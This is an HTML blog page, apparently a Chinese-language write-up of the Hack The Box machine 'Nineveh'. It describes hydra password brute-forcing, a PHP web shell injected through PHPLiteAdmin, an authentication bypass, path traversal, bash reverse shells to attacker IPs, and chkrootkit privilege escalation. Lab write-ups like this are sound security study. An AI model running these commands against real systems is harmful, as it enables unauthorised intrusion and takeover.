@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>nineveh | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan #### port explore 80:apache正常工作的界面 443:443端口是一张图片 #### 目录扫描 80端口扫到phpinfo，表明fileupload功能处于开启状态 443端口扫到db&#x2F;index.php,是一个登录界面  #### searchsploit &#96;searchsploit phpliteadmin&#96; 存在两个sql注入的利用，剩余两个一个版">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nineveh">
+<meta property="og:url" content="http://example.com/2022/09/07/nineveh/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan #### port explore 80:apache正常工作的界面 443:443端口是一张图片 #### 目录扫描 80端口扫到phpinfo，表明fileupload功能处于开启状态 443端口扫到db&#x2F;index.php,是一个登录界面  #### searchsploit &#96;searchsploit phpliteadmin&#96; 存在两个sql注入的利用，剩余两个一个版">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/nmap.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/dir.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/hydra.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/php.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/loc.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/note.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/cmd.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/shell.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/ssh.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/open.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/user.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/root.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/text.png">
+<meta property="og:image" content="http://example.com/2022/09/07/nineveh/py.png">
+<meta property="article:published_time" content="2022-09-08T02:14:55.000Z">
+<meta property="article:modified_time" content="2022-09-08T06:49:08.765Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/07/nineveh/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-nineveh" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/09/07/nineveh/" class="article-date">
+  <time class="dt-published" datetime="2022-09-08T02:14:55.000Z" itemprop="datePublished">2022-09-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      nineveh
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/07/nineveh/nmap.png">
+#### port explore
+80:apache正常工作的界面
+443:443端口是一张图片
+#### 目录扫描
+80端口扫到phpinfo，表明fileupload功能处于开启状态
+443端口扫到db/index.php,是一个登录界面
+<img src="/2022/09/07/nineveh/dir.png">
+#### searchsploit
+`searchsploit phpliteadmin`
+存在两个sql注入的利用，剩余两个一个版本不符合一个是xss和csrf利用
+#### hydra爆破密码
+`hydra 10.10.10.43 -l abc -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"`
+hydra强制要求一个用户名，-P为选择一个密码文件，https-post-form为一个插件，它将下面的字符串以：隔开，/db/index.php是以post方式传递的路径，第二部分是需要以post方式传送的数据，将^PASS^的内容替换为密码字典中的密码，最后的Incorrect password是回复包中表明登录失败的检测语句
+<img src="/2022/09/07/nineveh/hydra.png">
+爆破出的密码为password123
+#### shell reverse
+在登录以后，存在一个名为test的数据库，但其中并不存在表
+根据`PHPLiteAdmin 1.9.3 - Remote PHP Code Injection`的文件显示，实现rce的方法为先创建一个以.php为后缀的数据库，然后在里面建一张表，插入一条数据为`<?php system($_REQUEST["cmd"]);?>`
+<img src="/2022/09/07/nineveh/php.png">
+可以看到hack.php存储的位置，但是不知道应该如何访问
+<img src="/2022/09/07/nineveh/loc.png">
+在80端口还存在一个/department，也是一个登陆界面
+在测试后可以知道这个登录接口存在一个admin的用户
+这里存在一个以数组方式提交密码的phpbug
+在登陆时用burpsuite改包，将password改为password[],发现可以绕过认证实现登录
+<img src="/2022/09/07/nineveh/note.png">
+里面存在一条note信息
+因为其url里面的形式为`http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt`
+所以我们推测可能存在文件包含漏洞
+在尝试过后只有`notes=files/ninevehNotes/../../../../../../etc/passwd`和`/ninevehNotes/../../etc/passwd`会回显
+接下来我们可以根据之前存储的位置/var/tmp/hack.php看看能不能实现命令回显
+<img src="/2022/09/07/nineveh/cmd.png">
+然后将cmd内的命令改为`bash -c 'bash -i >%26 /dev/tcp/10.10.14.5/8888 0>%261'`
+<img src="/2022/09/07/nineveh/shell.png">
+成功获得回弹的shell
+在/var/www/ssl目录中的secure_notes下有主页上显示的图片，通过`strings nineveh.png`可以发现该图片中隐藏了ssh密钥
+<img src="/2022/09/07/nineveh/ssh.png">
+将这个保存到本地然后用ssh2john转化成john能破解的格式
+但是22端口只在本地开放了
+尝试使用knock使22端口开放，配置文件存在于/etc/kncokd.conf
+首先进行敲门
+`knock 10.10.10.43 571 290 911`
+或者使用nmap进行敲门
+`nmap -Pn --host-timeout 100 --max-retries 0 -p 571,290,911 10.10.10.34`
+使用telnet检验22端口是否开放
+<img src="/2022/09/07/nineveh/open.png">
+成功实现以user身份登录
+<img src="/2022/09/07/nineveh/user.png">
+#### root
+在report文件夹中存在一些report.txt,每分钟执行了一次
+这些文件是一个叫rootkit的程序产生的
+接下来是利用rootkit提权
+大致就是在/tmp文件夹中输入转发shell的语句，然后等有root权限的chkrootkit扫过来的时候语句会被执行，这个漏洞给并不需要amrols权限使用www就可以实现
+`echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.24/443 0>&1' > update`
+<img src="/2022/09/07/nineveh/root.png">
+预期的行为是设置$file_port为等于"$file_port $i"。但是由于""缺少 ，bash将其视为设置file_port=$file_port然后运行$i
+
+
+
+
+
+<p>第二种获得shell的方法是通过php的upload功能<br>首先我们将info.php的传输改为post并在方法体中加上content-type<br>&#96;<br>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—————————7db268605ae</p>
+<p>—————————–7db268605ae<br>Content-Disposition: form-data; name&#x3D;”dummyname”; filename&#x3D;”test.txt” Content-Type: text&#x2F;plainSecurity<br>Test<br>—————————–7db268605ae<br>&#96;<br>然后在返回的页面上我们可以看到传送的内容被存储器来了<br><img src="/2022/09/07/nineveh/text.png"><br>修改脚本为如下状态<br><img src="/2022/09/07/nineveh/py.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/07/nineveh/" data-id="cl7sovgas0000imcp1uh2h7z8" data-title="nineveh" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/09/06/haircut/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">haircut</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/haircut/">haircut</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/cronos/">cronos</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/bastard/">bastard</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
